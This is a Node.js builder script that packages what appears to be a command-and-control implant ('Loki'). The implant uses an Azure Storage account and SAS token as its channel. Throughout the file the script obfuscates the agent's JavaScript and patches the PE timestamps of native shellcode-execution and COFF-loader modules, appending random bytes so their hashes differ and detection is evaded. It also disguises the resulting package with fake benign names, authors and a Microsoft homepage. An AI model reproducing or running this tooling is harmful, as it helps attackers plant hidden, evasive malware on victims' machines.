const fs                        = require('fs');
const path                      = require('path');
const readline                  = require('readline');
const crypto                    = require('crypto');

// ---------- CLI Argument Parsing ----------
const rawArgs    = process.argv.slice(2);
const argMap     = {};
let appNameArg   = null;

// Parse arguments and app name
for (let i = 0; i < rawArgs.length; i++) {
    const arg = rawArgs[i];

    if (!arg.startsWith('-') && appNameArg === null) {
        appNameArg = arg;
        continue;
    }

    if (arg.startsWith('--')) {
        const [key, value] = arg.includes('=')
            ? arg.slice(2).split('=')
            : [arg.slice(2), rawArgs[i + 1] && !rawArgs[i + 1].startsWith('-') ? rawArgs[++i] : true];
        argMap[key] = value;
    } else if (arg.startsWith('-')) {
        const key = arg.slice(1);
        const value = rawArgs[i + 1] && !rawArgs[i + 1].startsWith('-') ? rawArgs[++i] : true;
        argMap[key] = value;
    }
}

//console.log(`Args :\r\n${JSON.stringify(argMap)}`);

// Sanitize appNameArg to comply with npm package.json rules
if (appNameArg) {
    appNameArg = appNameArg
        .toLowerCase()
        .replace(/[^a-z0-9-]/g, '')         // Remove invalid chars
        .replace(/^[^a-z]+/, '');           // Ensure starts with a letter
}

const isDebug = !!(argMap.debug || argMap.d);

if (isDebug) {
    console.log("Parsed arguments:", argMap);
    console.log("Sanitized App Name:", appNameArg);
}

// ---------- Help Menu ----------
if (argMap.h || argMap.help) {
    console.log(`
Usage: node create_agent_payload.js [AppName] [--account <StorageAccount>] [--token <SASToken>] [--meta <ContainerName>] [--tcp <port>] [-h|--help] [--debug|-d]

Arguments:
    AppName              Optional. Used to name the final output in package.json.
                        Must be lowercase, start with a letter, contain only letters, numbers, or dashes.
    --account            Azure Storage Account name. Will prompt if not provided.
    --token              Azure SAS Token. Will prompt if not provided.
    --meta               Container name for metadata. If omitted, a random name is generated.
    --tcp                Optional. TCP port for link mode. If specified, agent will run in link-tcp mode.
    --cleanup            Remove node modules, package.json, and other dependency files after execution.
    -h, --help           Show this help message and exit.
    --debug, -d          Enable verbose output about file operations.

Example:
    node create_agent_payload.js MyTool --account myacct --token 'se=2025...' --meta metaX123456 --tcp 8080 --debug

This script:
    - Obfuscates JavaScript files in ./agent and writes to ./app
    - Updates ./agent/config.js with storage config
    - Copies config to ./config.js
    - Generates or updates package.json
    - [Optional] Cleans up node_modules, package.json, etc. after execution
`);
    process.exit(0);
}

// ---------- Script State ----------
const sourceDir                 = path.join(__dirname, "agent");
const outputDir                 = path.join(__dirname, "app");
const configSrcPath             = path.join(sourceDir, 'config.js');
const configCopyPath            = path.join(__dirname, 'config.js');
const pkgSrcPath                = path.join(sourceDir, 'package.json');
const pkgDstPath                = path.join(outputDir, 'package.json');
const AssemblySrcPath           = path.join(sourceDir, 'assembly.node');
const AssemblyDstPath           = path.join(outputDir, 'assembly.node');
const scexecSrcPath             = path.join(sourceDir, 'scexec.node');
const scexecDstPath             = path.join(outputDir, 'scexec.node');
const CoffLoaderSrcPath         = path.join(sourceDir, 'COFFLoader.node');
const CoffLoaderDstPath         = path.join(outputDir, 'COFFLoader.node');
const cleanupTargets            = [
    path.join(__dirname, 'node_modules'),
    path.join(__dirname, 'package.json'),
    path.join(__dirname, 'package-lock.json')
];

const names                     = ["super-app", "cool-tool", "dev-helper", "ai-wizard", "code-master"];
const authors                   = ["Alice", "Bob", "Charlie", "Dana", "Elena"];
const descriptions              = [
    "An innovative AI solution.",
    "A tool for cutting-edge development.",
    "A next-gen automation engine."
];
const licenses                  = ["MIT", "Apache-2.0", "ISC", "BSD-3-Clause"];
const keywords                  = ["development", "AI", "automation", "tools"];

// ---------- Helpers ----------
function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomVersion() {
    return `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`;
}

function generateMetaContainer() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result  = 'm';
    while (result.length < 13) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function promptInput(promptText) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise(resolve => rl.question(promptText, ans => {
        rl.close();
        resolve(ans.trim());
    }));
}

function hashFile(filePath) {
    const fileBuffer = fs.readFileSync(filePath);
    return crypto.createHash('sha256').update(fileBuffer).digest('hex');
}

async function changeNodeHashes() {
    console.log("[+] Modifying PE binaries to have new hashes...");
    // Load original PE binaries
    const assembly_buffer   = fs.readFileSync(AssemblySrcPath);
    const scexec_buffer     = fs.readFileSync(scexecSrcPath);
    const coffldr_buffer    = fs.readFileSync(CoffLoaderSrcPath);

    // ----------- Assembly PE Modification -----------
    const assembly_peOffset         = assembly_buffer.readUInt32LE(0x3C);
    const assembly_timestampOffset  = assembly_peOffset + 8;
    const assembly_randomTime       = Math.floor(Date.now() / 1000) - Math.floor(Math.random() * 100000);

    assembly_buffer.writeUInt32LE(assembly_randomTime, assembly_timestampOffset);
    // console.log('[+] Patched PE timestamp (assembly):', new Date(assembly_randomTime * 1000).toUTCString());

    const assembly_junk     = crypto.randomBytes(128);
    const assembly_newBuffer = Buffer.concat([assembly_buffer, assembly_junk]);

    fs.writeFileSync(AssemblyDstPath, assembly_newBuffer);

    // ----------- Scexec PE Modification -----------
    const scexec_peOffset         = scexec_buffer.readUInt32LE(0x3C);
    const scexec_timestampOffset  = scexec_peOffset + 8;
    const scexec_randomTime       = Math.floor(Date.now() / 1000) - Math.floor(Math.random() * 100000);

    scexec_buffer.writeUInt32LE(scexec_randomTime, scexec_timestampOffset);
    //console.log('[+] Patched PE timestamp (scexec):', new Date(scexec_randomTime * 1000).toUTCString());

    const scexec_junk     = crypto.randomBytes(128);
    const scexec_newBuffer = Buffer.concat([scexec_buffer, scexec_junk]);

    fs.writeFileSync(scexecDstPath, scexec_newBuffer);

    // ----------- COFF Loader PE Modification -----------
    const coffldr_peOffset         = coffldr_buffer.readUInt32LE(0x3C);
    const coffldr_timestampOffset  = coffldr_peOffset + 8;
    const coffldr_randomTime       = Math.floor(Date.now() / 1000) - Math.floor(Math.random() * 100000);

    coffldr_buffer.writeUInt32LE(coffldr_randomTime, coffldr_timestampOffset);
    // console.log('[+] Patched PE timestamp (coffldr):', new Date(coffldr_randomTime * 1000).toUTCString());

    const coffldr_junk     = crypto.randomBytes(128);
    const coffldr_newBuffer = Buffer.concat([coffldr_buffer, coffldr_junk]);

    fs.writeFileSync(CoffLoaderDstPath, coffldr_newBuffer);

    // console.log(`- Original assembly.node hash : ${hashFile(AssemblySrcPath)}`);
    // console.log(`- Original scexec.node   hash : ${hashFile(scexecSrcPath)}`);
    console.log(`\t- Payload assembly.node   hash : ${hashFile(AssemblyDstPath)}`);
    console.log(`\t- Payload scexec.node     hash : ${hashFile(scexecDstPath)}`);
    console.log(`\t- Payload COFFLoader.node hash : ${hashFile(CoffLoaderDstPath)}`);
}

function cleanup() {
    console.log("[+] Cleanup initiated.");
    // Cleanup node_modules and other files
    for (const target of cleanupTargets) {
        if (fs.existsSync(target)) {
            try {
                const stat = fs.lstatSync(target);
                if (stat.isDirectory()) {
                    fs.rmSync(target, { recursive: true, force: true });
                    if (isDebug) console.log(`Removed directory: ${target}`);
                } else {
                    fs.unlinkSync(target);
                    if (isDebug) console.log(`Removed file: ${target}`);
                }
            } catch (err) {
                console.warn(`Failed to remove ${target}:`, err.message);
            }
        }
    }
}

// ---------- Check Dependency ----------
let JavaScriptObfuscator;
try {
    if (argMap.cleanup) {
        cleanup();
        process.exit(0);
    }
    JavaScriptObfuscator = require('javascript-obfuscator');
} catch (err) {
    if (err.code === 'MODULE_NOT_FOUND') {
        console.warn("'javascript-obfuscator' not found.");
            console.warn('[!] First install javascript-obfuscator dependency:\r\n\tnpm install --save-dev javascript-obfuscator');
            process.exit(0);
    } else {
        throw err;
    }
}

// ---------- Reset Output Directory ----------
try {
    if (fs.existsSync(outputDir)) {
        fs.rmSync(outputDir, { recursive: true, force: true });
        if (isDebug) console.log("Deleted existing './app' directory.");
    }
    fs.mkdirSync(outputDir, { recursive: true });
    if (isDebug) console.log("Created new './app' directory.");
} catch (err) {
    console.error("Error managing output directory:", err.message);
    process.exit(1);
}

// ---------- Main Logic ----------
(async () => {
    try {
        if(!argMap.token || !argMap.account || !argMap.meta) {
            console.log("[+] Provide Azure storage account information:");
        }
        const storageAccount = argMap.account || await promptInput("\t- Enter Storage Account  : ");
        const sasToken       = argMap.token   || await promptInput("\t- Enter SAS Token        : ");
        const metaContainer  = argMap.meta    || "mzl80liqhujwg";
        //const metaContainer  = argMap.meta    || generateMetaContainer();

        console.log("\n[+] Configuration:");
        console.log("\t- Storage Account :", storageAccount);
        console.log("\t- SAS Token       :", sasToken);
        console.log("\t- Meta Container  :", metaContainer);

        const tcpPort = argMap.tcp ? parseInt(argMap.tcp) : 3000;
        const mode = argMap.tcp ? 'link-tcp' : 'egress';

        const configContent = `module.exports = {
    storageAccount: '${storageAccount}',
    metaContainer: '${metaContainer}',
    sasToken: '${sasToken}',
    p2pPort: ${tcpPort},
    mode: '${mode}'
};\n`;

        fs.writeFileSync(configSrcPath, configContent, 'utf-8');
        fs.copyFileSync(configSrcPath, configCopyPath);
        console.log(`\n[+] Updated ${configCopyPath} with storage configuration\r\n - Enter into the Loki Client UI\r\n\tLoki Client > Configuration\r\n`);

        // Obfuscate & copy
        fs.readdirSync(sourceDir).forEach(file => {
            const sourcePath = path.join(sourceDir, file);
            const outputPath = path.join(outputDir, file);

            if (fs.lstatSync(sourcePath).isFile()) {
                if (file.endsWith(".js")) {
                    if (isDebug) console.log(`Obfuscating: ${file}`);
                    try {
                        const code = fs.readFileSync(sourcePath, "utf-8");
                        const obfuscatedCode = JavaScriptObfuscator.obfuscate(code, {
                            compact: true,
                            controlFlowFlattening: true,
                            stringArrayEncoding: ["rc4"]
                        }).getObfuscatedCode();
                        fs.writeFileSync(outputPath, obfuscatedCode);
                        if (isDebug) console.log(`Obfuscated: ${file}`);
                    } catch (err) {
                        console.error(`Error obfuscating ${file}:`, err.message);
                    }
                } else if (file.endsWith(".css") || file.endsWith(".html")) {
                    fs.copyFileSync(sourcePath, outputPath);
                    if (isDebug) console.log(`Copied: ${file}`);
                }
            }
        });
    await changeNodeHashes();
    } catch (err) {
        console.error("Unexpected error during processing:", err.message);
        process.exit(1);
    }
})();


// ---------- Final Cleanup + Metadata ----------
process.on('exit', () => {
    try {
        if (fs.existsSync(pkgSrcPath)) {
            const pkgData = JSON.parse(fs.readFileSync(pkgSrcPath, "utf-8"));
            delete pkgData.build;
            delete pkgData.dependencies;
            delete pkgData.devDependencies;

            pkgData.name        = appNameArg || randomChoice(names);
            pkgData.version     = randomVersion();
            pkgData.keywords    = keywords;
            pkgData.author      = randomChoice(authors);
            pkgData.description = randomChoice(descriptions);
            pkgData.license     = randomChoice(licenses);
            pkgData.homepage    = "https://www.microsoft.com";

            fs.writeFileSync(pkgDstPath, JSON.stringify(pkgData, null, 2), "utf-8");
            if (isDebug) console.log("package.json updated with custom values.");
            console.log(`\n[+] Payload ready!`);
            console.log(`\t - Obfuscated payload in the ./app directory`);
        } else {
            console.warn("No package.json found in ./agent/ directory.");
        }
    } catch (err) {
        console.error("Failed to update package.json:", err.message);
    }
});
